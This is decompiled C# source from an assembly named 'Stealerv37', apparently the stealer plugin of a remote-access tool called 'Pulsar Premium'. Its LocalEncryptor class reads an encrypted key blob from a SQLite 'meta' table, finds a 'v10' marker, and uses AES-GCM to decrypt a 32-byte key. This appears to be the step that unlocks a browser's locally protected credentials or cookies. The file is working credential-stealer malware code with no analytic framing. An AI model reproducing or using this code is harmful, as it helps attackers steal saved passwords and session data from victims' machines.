// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.LocalEncryptor
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Sql;
using System;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class LocalEncryptor
{
  public static byte[] ExtractEncryptionKey(SqLite sql, byte[] encryptionKey)
  {
    byte[] numArray1 = new byte[0];
    if (sql.ReadTable("meta"))
    {
      for (int rowNum = 0; rowNum < sql.GetRowCount(); ++rowNum)
      {
        if (sql.GetValue(rowNum, 0).Equals("local_encryptor_data"))
        {
          numArray1 = Encoding.Default.GetBytes(sql.GetValue(rowNum, 1));
          break;
        }
      }
    }
    int byteSequence = LocalEncryptor.FindByteSequence(numArray1, Encoding.ASCII.GetBytes("v10"));
    if (byteSequence == -1)
      return (byte[]) null;
    byte[] numArray2 = new byte[96 /*0x60*/];
    Array.Copy((Array) numArray1, byteSequence + 3, (Array) numArray2, 0, 96 /*0x60*/);
    byte[] numArray3 = new byte[12];
    Array.Copy((Array) numArray2, 0, (Array) numArray3, 0, 12);
    int length = numArray2.Length - 12 - 16 /*0x10*/;
    byte[] numArray4 = new byte[length];
    Array.Copy((Array) numArray2, 12, (Array) numArray4, 0, length);
    byte[] numArray5 = new byte[16 /*0x10*/];
    Array.Copy((Array) numArray2, numArray2.Length - 16 /*0x10*/, (Array) numArray5, 0, 16 /*0x10*/);
    byte[] sourceArray = AesGcm256.Decrypt(encryptionKey, numArray3, (byte[]) null, numArray4, numArray5);
    if (BitConverter.ToInt32(sourceArray, 0) != 538050824)
      return (byte[]) null;
    byte[] destinationArray = new byte[32 /*0x20*/];
    Array.Copy((Array) sourceArray, 4, (Array) destinationArray, 0, 32 /*0x20*/);
    return destinationArray;
  }

  private static int FindByteSequence(byte[] src, byte[] pattern)
  {
    int num = src.Length - pattern.Length + 1;
    for (int byteSequence = 0; byteSequence < num; ++byteSequence)
    {
      if ((int) src[byteSequence] == (int) pattern[0])
      {
        for (int index = pattern.Length - 1; index >= 1 && (int) src[byteSequence + index] == (int) pattern[index]; --index)
        {
          if (index == 1)
            return byteSequence;
        }
      }
    }
    return -1;
  }
}
